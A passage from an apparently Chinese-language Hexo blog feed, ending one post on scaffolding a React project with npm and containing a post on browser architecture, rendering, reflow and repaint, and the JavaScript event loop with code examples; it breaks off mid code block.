class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">npm install -g create-react-app</span><br><span class="line">npx create-react-app my-app</span><br><span class="line">cd my-app</span><br><span class="line">npm start</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 暴露配置项</span><br><span class="line"><span class="meta">#</span> 由于create-react-app的webpack配置信息都是封装好的，为了灵活修改配置，这个命令可以把配置文件暴露出来</span><br><span class="line">npm run eject</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 本地服务启动</span><br><span class="line">npm run start</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 确定目录结构</span><br><span class="line">- src</span><br><span class="line">  - assets        # 静态资源</span><br><span class="line">  - libs          # font字体文件</span><br><span class="line">  - components    # 公用组件</span><br><span class="line">  - page          # 页面</span><br><span class="line">    - Home</span><br><span class="line">      - index.js</span><br><span class="line">      - index.scss</span><br><span class="line">    - Login </span><br><span class="line">      - index.js</span><br><span class="line">      - index.scss</span><br><span class="line">  Router.js       # 定义路由</span><br><span class="line">  index.js        # 最外层组件</span><br><span class="line">  index.css       # 全局样式</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> antd集成</span><br><span class="line"><span class="meta">#</span> 推荐使用babel-plugin-import加载组件 https://github.com/ant-design/babel-plugin-import，修改配置</span><br><span class="line">npm install babel-plugin-import --save</span><br><span class="line">npm install antd --save</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 路由集成</span><br><span class="line">npm install --save react-router-dom</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> redux集成，使用dva</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> axios集成</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> react-intl集成</span><br></pre></td></tr></table></figure></p><h4 id="2-项目目录"><a href="#2-项目目录" class="headerlink" title="2. 项目目录"></a>2. 项目目录</h4><h3 id="2-ant-design-pro"><a href="#2-ant-design-pro" class="headerlink" title="2. ant design pro"></a>2. ant design pro</h3><h3 id="3-基于webpack搭建的React项目"><a href="#3-基于webpack搭建的React项目" class="headerlink" title="3. 基于webpack搭建的React项目"></a>3. 基于webpack搭建的React项目</h3><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://juejin.im/post/5a8fe00f5188257a6e40452b" target="_blank" rel="noopener">React项目模板-从项目搭建到部署</a></li><li><a href="https://juejin.im/post/5a715fadf265da3e5661d667" target="_blank" rel="noopener">从零开始搭建React全家桶环境</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>浏览器：从输入URL到页面显示发生了什么？</title>
      <link href="/2019/06/13/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
      <url>/2019/06/13/%E6%B5%8F%E8%A7%88%E5%99%A8/</url>
      <content type="html"><![CDATA[<h3 id="1-多进程的浏览器"><a href="#1-多进程的浏览器" class="headerlink" title="1. 多进程的浏览器"></a>1. 多进程的浏览器</h3><p>浏览器是多进程的，包括主控进程，插件进程，GPU，每一个tab页都会新开一个进程（某些情况下多个tab会合并进程）。</p><ul><li>Browser进程： 浏览器的主进程（负责协调、主控），只有一个</li><li>第三方插件进程： 每个类型的插件对应一个进程，仅当使用该插件时才创建</li><li>GUP进程： 最多一个，用于3D绘制</li><li>浏览器渲染进程（内核）： 默认每个tab页面都会新开一个进程，互不影响，控制页面渲染，脚本执行，事件处理等。（有时会优化，如多个空白tab会合并成一个进程）。</li></ul><p><br><br><img src="/2019/06/13/浏览器/1.png" style="max-width:400px"></p><blockquote><p>需要注意，浏览器和浏览器内核是不同的概念，浏览器指的是Chrome, Firefox，而浏览器内核是Blink, Gecko, 浏览器内核只负责渲染，GUI及网络连接等跨平台工作则是浏览器实现的。</p></blockquote><p><br></p><h3 id="2-浏览器渲染进程-内核"><a href="#2-浏览器渲染进程-内核" class="headerlink" title="2. 浏览器渲染进程(内核)"></a>2. 浏览器渲染进程(内核)</h3><p>每新建一个tab页面会新开一个浏览器渲染进程，这个进程是多线程的，用来处理页面的渲染，JS的执行，事件的循环。</p><p><br></p><h4 id="2-1-子线程"><a href="#2-1-子线程" class="headerlink" title="2.1 子线程"></a>2.1 子线程</h4><p>浏览器渲染进程，有几大类子线程：</p><h5 id="2-1-1-GUI渲染线程"><a href="#2-1-1-GUI渲染线程" class="headerlink" title="2.1.1 GUI渲染线程"></a>2.1.1 GUI渲染线程</h5><ul><li>负责渲染浏览器界面，解析HTML, CSS, 构建DOM树和RenderObject树，布局和绘制等。</li><li>当界面需要重绘(Repaint) 或由于某种操作引发回流(reflow)时，该线程就会执行</li><li>注意，GUI渲染线程和JS引擎线程是互斥的，当JS引擎执行时GUI线程会被挂起，GUI更新会被保存在一个队列中等到JS引擎空闲时立即被执行。 </li></ul><p>（由于Javascript可以操纵DOM，如果修改这些元素属性同时渲染页面，那么渲染线程前后获得的元素数据就可能不一致，为了防止渲染出现不可预期的结果，浏览器设置GUI渲染线程与JS互斥的关系。）</p><h5 id="2-1-2-JS引擎线程"><a href="#2-1-2-JS引擎线程" class="headerlink" title="2.1.2 JS引擎线程"></a>2.1.2 JS引擎线程</h5><ul><li>也成为JS内核，负责处理Javascript脚本程序（如V8引擎）</li><li>JS引擎线程负责解析Javascript脚本，运行代码</li><li>JS引擎一直等待着任务队列中任务的到来，然后加以处理。</li><li>GUI渲染线程与JS引擎线程是互斥的，如果JS执行的时间过长，就会造成页面的渲染不连贯，导致页面渲染加载阻塞。</li></ul><h5 id="2-1-3-事件触发线程"><a href="#2-1-3-事件触发线程" class="headerlink" title="2.1.3 事件触发线程"></a>2.1.3 事件触发线程</h5><ul><li>当JS引擎执行代码块如setTimeOut，绑定鼠标点击，ajax异步请求，会将对应任务添加到事件线程中。</li><li>当对应的事件触发条件被触发时，该线程会把时间添加到待处理队列的队尾，等待JS引擎的处理</li><li>由于JS的单线程关系，这些待处理队列中的事件，只在JS引擎空闲时才会去执行</li></ul><h5 id="2-1-4-定时触发器线程"><a href="#2-1-4-定时触发器线程" class="headerlink" title="2.1.4 定时触发器线程"></a>2.1.4 定时触发器线程</h5><ul><li><em><code>setInterval</code></em>与<em><code>setTimeout</code></em>所在线程</li><li>浏览器定时计数器不是由JS引擎计数的（因为Javascript引擎是单线程的，如果处于阻塞线程状态，计时将不准确）</li><li>因此通过单独线程来计时并触发定时（计时完毕后，添加到事件队列中，等待JS引擎空闲时执行）</li></ul><h5 id="2-1-5-异步http请求线程"><a href="#2-1-5-异步http请求线程" class="headerlink" title="2.1.5 异步http请求线程"></a>2.1.5 异步http请求线程</h5><ul><li>发起XMLHttpRequest连接后，浏览器会新开一个线程处理请求<br>（一个http一个线程？）</li><li>在检测到状态变更时，如果设置有回调函数，异步线程就会产生状态变更事件，将这个回调再放入事件队列中。由JS引擎执行。</li></ul><p><br></p><h4 id="2-2-常见浏览器内核"><a href="#2-2-常见浏览器内核" class="headerlink" title="2.2 常见浏览器内核"></a>2.2 常见浏览器内核</h4><p>浏览器渲染进程，指的就是我们平时所说的浏览器内核。浏览器内核可以分为两部分： 渲染引擎和JS引擎。<em>渲染引擎</em>负责取得网页的内容（HTML, XML, 图像等等）、整理讯息（加入CSS）, 以及计算网页的显示方式，然后输出至显示器或打印机。<em>JS引擎</em>，则是解析和执行javascript。</p><p>最开始渲染引擎和JS引擎没有区分的很明确，后来JS引擎越来越独立，内核就倾向于只指渲染引擎。常见的浏览器内核：Trident（IE内核），</p><p><em>1. Trident(IE内核)</em><br>IE内核在1997年的IE4中首次被采用，是微软在Mosaic(人类第一个浏览器)代码基础上修改而来的，并沿用到IE11。IE内核曾经几乎与W3C标准脱节（2005年），内核中大量bug等安全性问题也没有得到及时解决。国内很多双核浏览器的其中一核便是Trident,美其名曰“兼容模式”。Window10发布后，IE将其内置浏览器命名为Edge, Edge最显著的特点就是新内核EdgeHTML。</p><p><em>2. Gecko（Firefox）</em><br>Netscape6, Mozilla Firefox也采用了该内核。Gecko引擎与IE不无关系，IE没有使用W3C标准，导致了微软内部一些开发人员的不满，他们与当时已经停止更新了的Netscape的一些员工，一起创办了Mozilla。</p><p><em>3. Webkit（Safari）</em><br>当年苹果在比较了Gecko和KHTML后，选择了后者来做引擎开发，是因为KHTML拥有清晰的源码结构和极快的渲染速度。Webkit内核 可以说是以硬件盈利为主的苹果公司给软件行业的最大贡献之一。随后，2008年谷歌公司发布Chorme浏览器，采用的chromium内核就是fork了Webkit</p><p><em>4. Chromium/Blink（Chrome）</em><br>2008年，谷歌公司发布了chrome浏览器，浏览器使用的内核被命名为chromium。choromium fork字开源引擎webkit。谷歌公司还研发了自己的javascript引擎，V8,极大地提高了javascript的运算速度。chromium问世后，一些基于chromium的单核，双核浏览器拔地而起，如搜狗、360、qq浏览器。2013年，谷歌发表将于webkit分道扬镳，在chromium项目中研发Blink渲染引擎，内置于Chorme浏览器中。</p><p><em>5. 移动端内置浏览器内核</em><br>目前移动设备浏览器上常用的内核有Webkit, Blink, Trident, Gecko等。其中iphone和iPad等ios平台主要是webkit, Android 4.4之前安卓系统浏览器内核是webkit， android系统浏览器切换到chromium。Window Phone 8系统浏览器内核是Trident。</p><p><br><br><br></p><h3 id="3-解析URL"><a href="#3-解析URL" class="headerlink" title="3. 解析URL"></a>3. 解析URL</h3><p>当操作系统GUI将输入事件传递到了浏览器，在这过程中，浏览器可能会做一些预处理，比如Chrome会根据历史统计来预估输入字符对应的网站。比如输入了<code>[ba]</code>,根据之前的历史发现90%的概率会访问<code>[www.baidu.com]</code>，因此就会在输入回车前开始建立TCP链接甚至渲染了。</p><p>输入URL后的[回车]，这时浏览器会进行检查，首先判断协议，如果是http就按照web来处理，调用浏览器内核中的对应方法，如WebView中的loadUrl方法。从应用角度看，主要做两件事件：通过DNS查询IP，通过Socket发送数据。<em>每个网络请求时都需要开辟单独的线程进行。</em></p><p><br><br><img src="/2019/06/13/浏览器/2.png" style="max-width:500px"></p><h3 id="4-浏览器渲染页面"><a href="#4-浏览器渲染页面" class="headerlink" title="4. 浏览器渲染页面"></a>4. 浏览器渲染页面</h3><p>从耗时的角度，浏览器请求、加载、渲染一个页面，时间花在下面五件事件上：</p><ul><li>DNS查询</li><li>TCP连接</li><li>HTTP请求</li><li>服务器响应</li><li>客户端渲染</li></ul><p>浏览器对内容的渲染（渲染树构建、布局及绘制），又可以分为下面几个步骤：</p><ul><li>解析HTML，构建DOM树</li><li>解析CSS，生成CSS规则树</li><li>合并DOM树和CSS规则树，生成render树</li><li>布局render树（Layout/reflow），负责各元素尺寸、位置的计算</li><li>绘制render树（paint）,绘制页面像素信息</li><li>浏览器会将各层的信息发送给GPU, GPU会将各层合成（composite）,显示在屏幕上</li></ul><p><img src="/2019/06/13/浏览器/3.png"></p><p>如果DOM或CSSDOM被修改，上面的过程需要重复执行，才能计算出哪些像素需要在屏幕上重新渲染。实际上，CSS与javascript往往会多次修改DOM和CSSDOM。</p><p><br></p><h4 id="4-1-DOM树"><a href="#4-1-DOM树" class="headerlink" title="4.1 DOM树"></a>4.1 DOM树</h4><p>假设拿到了这样的页面：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width,initial-scale=1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"style.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Critical Path<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello <span class="tag">&lt;<span class="name">span</span>&gt;</span>web performance<span class="tag">&lt;/<span class="name">span</span>&gt;</span> students!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"awesome-photo.jpg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>解析HTML，构建出DOM的过程可以简述如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bytes → characters → tokens → nodes → DOM</span><br></pre></td></tr></table></figure></p><p><em>转换</em>：浏览器先将获得的HTML内容(Bytes)基于指定的编码转换为单个字符。<br><em>分词</em>：按照HTML规范将这些字符转换为不同的标记token。每个token都有自己独特的含义以及规则集。<br><em>词法分析</em>：分词的结果是得到一堆的token，此时把他们转换为对象，这些对象分别有它们对应的属性和规则<br><em>DOM构建</em>：根据标签之间的贵溪，最终得到一个树形结构的DOM树。</p><p><img src="/2019/06/13/浏览器/4.png"></p><p><br></p><h4 id="4-2-CSS规则树"><a href="#4-2-CSS规则树" class="headerlink" title="4.2 CSS规则树"></a>4.2 CSS规则树</h4><p>CSS规则树的生成也是类似<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bytes -&gt; characters -&gt; tokens -&gt; nodes -&gt; CSSDOM</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="4-3-Render树"><a href="#4-3-Render树" class="headerlink" title="4.3 Render树"></a>4.3 Render树</h4><p>当DOM树和CSSDOM树都有了后，就要构建渲染树了。一般来说，渲染树和DOM树相对应，但不是严格意义上的一一对应，因为有一些不可见的DOM元素不会插入到渲染树中。如<code>display：none</code>的元素，和<code>&lt;head&gt;</code>这样的不可见标签。<br><br><br><img src="/2019/06/13/浏览器/5.png"></p><p><br><br><br></p><h4 id="4-4-渲染"><a href="#4-4-渲染" class="headerlink" title="4.4 渲染"></a>4.4 渲染</h4><p>有了render树，接下来就是渲染，主要有4个步骤:</p><ul><li>计算CSS样式</li><li>构建渲染树</li><li>布局，主要定位坐标的大小，是否换行，各种position overflow z-index属性</li><li>绘制，将图像绘制出来<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Render Tree -&gt; Compute style -&gt; construct frames -&gt; layout -&gt; paint</span><br></pre></td></tr></table></figure></li></ul><p>js动态修改dom或css，会导致重新布局(Layout)或渲染(Repaint)。</p><p><br></p><h5 id="4-4-1-回流"><a href="#4-4-1-回流" class="headerlink" title="4.4.1 回流"></a>4.4.1 回流</h5><p>Layout，也称为Reflow, 回流。意味着元素的内容、结构、位置或尺寸发生了变化，需要重新计算样式和渲染树。</p><ul><li>页面渲染初始化</li><li>DOM结构改变，如删除了某个几点</li><li>render树变化，如减少了padding</li><li>窗口resize</li><li>获取某些属性也会触发回流：offset(Top/Left/Width/Height), scroll(Top/Left/Width/Height), client(Top/Left/Width/Height), width, height, 调用getComputedStyle</li></ul><p><br></p><h5 id="4-4-2-重绘"><a href="#4-4-2-重绘" class="headerlink" title="4.4.2 重绘"></a>4.4.2 重绘</h5><p>Repaint，即重绘。意味着只有一些外观属性发生了变化（例如，背景色，边框颜色，文字颜色），此时只需要应用新样式绘制这个元素就可以了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">document</span>.body.style;</span><br><span class="line">s.padding = <span class="string">"2px"</span>;            <span class="comment">// 回流+ 重绘</span></span><br><span class="line">s.border = <span class="string">"1px solid red"</span>;   <span class="comment">// 再一次 回流+重绘</span></span><br><span class="line">s.color = <span class="string">"blue"</span>;             <span class="comment">// 再一次 重绘</span></span><br><span class="line">s.backgroundColor = <span class="string">"#ccc"</span>;   <span class="comment">// 再一次 重绘</span></span><br><span class="line">s.fontSize = <span class="string">"14px"</span>;          <span class="comment">// 再一次 回流+重绘</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChld(<span class="built_in">document</span>.createTextNode(<span class="string">'abc!'</span>));  <span class="comment">// 再一次 回流+重绘</span></span><br></pre></td></tr></table></figure><p><br></p><h5 id="4-4-3-避免回流"><a href="#4-4-3-避免回流" class="headerlink" title="4.4.3 避免回流"></a>4.4.3 避免回流</h5><p>回流的成本开销要高于重绘，一个节点的回流往往导致子节点以及同级节点的回流，尽量避免回流一般有这些优化方案：</p><ul><li>减少逐项更改样式，一次性修改style，或将样式已定义为class一次性更新</li><li>避免循环操作dom，创建一个documentFragment或div,在上面应用所有dom后，再添加到window.document</li><li>避免多次读取offset属性，缓存到变量</li><li>复杂的元素用绝对定位或固定定位，使得它脱离文档流，否则回流代价会很高</li></ul><p><br></p><h4 id="4-5-资源外链下载"><a href="#4-5-资源外链下载" class="headerlink" title="4.5 资源外链下载"></a>4.5 资源外链下载</h4><p>当html解析器被脚本阻塞时，解析器虽然会停止构建DOM，但仍会识别该脚本后面的资源，并进行预加载。它们包括CSS样式资源，JS脚本资源，img图片资源。遇到这些外链时，会单独开启一个下载线程去下载资源。</p><p><em>css样式资源</em></p><ul><li>css下载时异步，不会阻塞浏览器构建dom树</li><li>css被视为阻塞渲染的资源，浏览器将不会渲染任何已处理的内容，知道CSSDOM构建完毕</li><li>media query声明的css不会阻塞渲染，会在符合条件时阻塞渲染</li></ul><p><em>js脚本资源</em></p><ul><li>当浏览器遇到一个script标签时，DOM构建将暂停，直至脚本完成执行</li><li>在脚本阻塞时，也会继续下载其他资源，但解析过程仍然是阻塞的</li><li>defer: 延迟执行引入的js，即这段js加载时html并未停止解析，这两个过程是并行的。整个document解析完毕而且defer-script也加载完成之后，会执行所有由defer-script加载的js代码，然后触发DOMContentLoaded事件。</li><li>async: 异步执行引入的js，async-script可能在DOMContentLoaded触发之前或之后执行，但一定在load触发之前执行。多个async-script的执行顺序是不确定的。<strong>注意：向document动态添加script标签时，async属性默认是true</strong>。如果想同步执行，需要把async属性人为设置为false。<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"app.js"</span> <span class="attr">defer</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"app.js"</span> <span class="attr">async</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p><em>img图片资源</em><br>遇到图片资源时，直接会异步下载，不会阻塞解析，下载完后直接用图片替换原有src的地方</p><p><br></p><h3 id="4-JS引擎解析"><a href="#4-JS引擎解析" class="headerlink" title="4. JS引擎解析"></a>4. JS引擎解析</h3><p>作为浏览器脚本语言，javascript的主要用途是与用户交互，以及操作DOM。这决定了它只能是单线程，否则会带来很复杂的同步问题。比如，同时有两个线程，一个线程在某个DOM节点上添加内容，另一个线程删除了这个节点，这时浏览器应该以哪个线程为准？为了避免复杂性，<em>Javascript就是单线程</em>。</p><p>一个Javascript引擎会常驻与内存中，它等待宿主(浏览器/node)把js代码传递给它执行。浏览器还会给javascript引擎提供像setTimeout这样的API，它允许javascript在特定的时机执行。在ES3前，js本身还没有异步执行代码的能力。但在es5之后，js引入了Promise，这样，不用浏览器的安排，js引擎本身也可以发起任务。<br><br></p><h4 id="4-1-Event-Loop"><a href="#4-1-Event-Loop" class="headerlink" title="4.1 Event Loop"></a>4.1 Event Loop</h4><p>单线程就意味着，所有任务都需要排队，前一个任务结束，才会执行后一个任务。但是很多时候CPU是闲着的，因为IO设备很慢（如ajax从网络读取数据），不得不等着结果出来，再往下执行。Javascript的设计者意识到，这时主线程完全可以不管IO设备，挂起等待中的任务，先运行排在后面的任务。等IO返回了结果，再回过头，把挂起的任务继续执行下去。</p><p>于是，所有任务可以分成两种，同步任务和异步任务。<em>同步任务</em>指的是，在主线程上排队执行的任务，只有前一个任务执行完毕，才能执行后一个任务；<em>异步任务</em>指的是，不进去主线程，而进入任务队列的任务，只有任务队列通知主线程，某个异步任务可以执行了，改任务才会进入主线程执行。</p><p>Event Loop的运行机制:</p><ul><li>所有同步任务都在主线程上执行，形成一个执行栈</li><li>主线程之外，还存在一个任务队列。只要异步任务有了运行结果，就在任务队列中放置一个事件。</li><li>一旦“执行栈”中的所有同步任务执行完毕，系统就会读取“任务队列”，看看里面有哪些事件。这些事件，可以结束等待状态，进入执行栈，开始执行。</li><li>主线程不断重复上面步骤</li></ul><p>只要主线程空了，就会去读取“任务队列”，这个运行机制被称为<em>Event Loop</em></p><p>主线程运行的时候，产生堆(heap)和栈(stack)，栈中的代码调用各种外部API，它们在“任务队列”中加入各种事情(click, load, done)。只要栈中的代码执行完毕，主线程就会去读“任务队列”，依次执行那些事件对应的回调函数。</p><p><img src="/2019/06/13/浏览器/7.png"></p><p><br></p><h4 id="4-2-宏观任务"><a href="#4-2-宏观任务" class="headerlink" title="4.2 宏观任务"></a>4.2 宏观任务</h4><p>我们把宿主发起的任务成为<strong>宏观任务</strong>，把js引擎发起的任务成为<strong>微观任务</strong>。</p><p>宏观任务的队列相当于事件循环。在宏观任务中，javascript的Promise还会产生异步代码，js会保证这些异步代码在一个宏观任务中完成，因此宏观任务中又包含了一个微观任务队列，机制如下：</p><ul><li>执行一个宏任务（栈中没有就从事件队列中获取）</li><li>执行过程中如果遇到微任务，就将它添加到微任务的任务队列中</li><li>宏任务执行完毕后，立即执行当前微任务队列中的所有微任务（依次执行）</li><li>当前宏任务执行完毕，开始检查渲染，然后GUI线程接管渲染</li><li>渲染完毕后，js线程继续接管，开始下一个宏任务</li></ul><p><img src="/2019/06/13/浏览器/8.png" style="max-width:300px"></p><p>宏观任务有：</p><ul><li>setTimeout,setInterval</li><li>requestAnimationFrame</li><li>解析HTML</li><li>执行主线程js代码</li><li>修改url</li><li>页面加载，UI渲染</li><li>用户交互</li></ul><p><em>问题： 怎样确定一个函数在dom更新后执行？</em></p><p><br></p><h4 id="4-2-微观任务"><a href="#4-2-微观任务" class="headerlink" title="4.2 微观任务"></a>4.2 微观任务</h4><p>Promise是js语言提供的一种标准化的异步管理方式。Promise永远在队列尾部添加微观任务，setTimeout等宿主API,则会添加宏观任务。</p><p>微观任务有: </p><ul><li>process.nextTick</li><li>Object.observer</li><li>MutationObserver</li><li>Promise</li></ul><p>Promise的resolve始终是异步操作，所以c无法出现在b之前<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> r = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'a'</span>);</span><br><span class="line">  resolve()</span><br><span class="line">&#125;)</span><br><span class="line">r.then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'c'</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'b'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// a b c</span></span><br></pre></td></tr></table></figure></p><p>Promise产生的是Javascript引擎内部的微任务，而setTimeout是浏览器API，它产生宏任务。微任务始终先于宏任务。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> r = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'a'</span>);</span><br><span class="line">  resolve()</span><br><span class="line">&#125;);</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'d'</span>), <span class="number">0</span>);</span><br><span class="line">r.then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'c'</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'b'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// a b c d</span></span><br></pre></td></tr></table></figure></p><p>执行一个耗时1s的Promise，确保了任务b是在d之后被添加到任务队列。即使耗时一秒的c执行完毕，才执行b，它们仍然先于d执行。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'d'</span>), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">var</span> r = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">  resolve();</span><br><span class="line">&#125;)</span><br><span class="line">r.then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> begin = <span class="built_in">Date</span>.now();</span><br><span class="line">  <span class="keyword">while</span>(<span class="built_in">Date</span>.now() - begin &lt; <span class="number">1000</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'c'</span>);</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">      resolve()</span><br><span class="line">    &#125;).then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'b'</span>))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// c b d</span></span><br></pre></td></tr></table></figure></p><p>第一个宏观任务中，执行了a,b。setTimeout后，第二个宏观任务执行resolve，then中的异步代码得到执行，输出了c<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params">duration</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'b'</span>);</span><br><span class="line">    setTimeout(resolve, duration)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'a'</span>);</span><br><span class="line">sleep(<span class="number">500</span>).then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'c'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// a b c</span></span><br></pre></td></tr></table></figure></p><h4 id="4-3-开发中碰到的问题"><a href="#4-3-开发中碰到的问题" class="headerlink" title="4.3 开发中碰到的问题"></a>4.3 开发中碰到的问题</h4><p>开发中碰到的问题<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 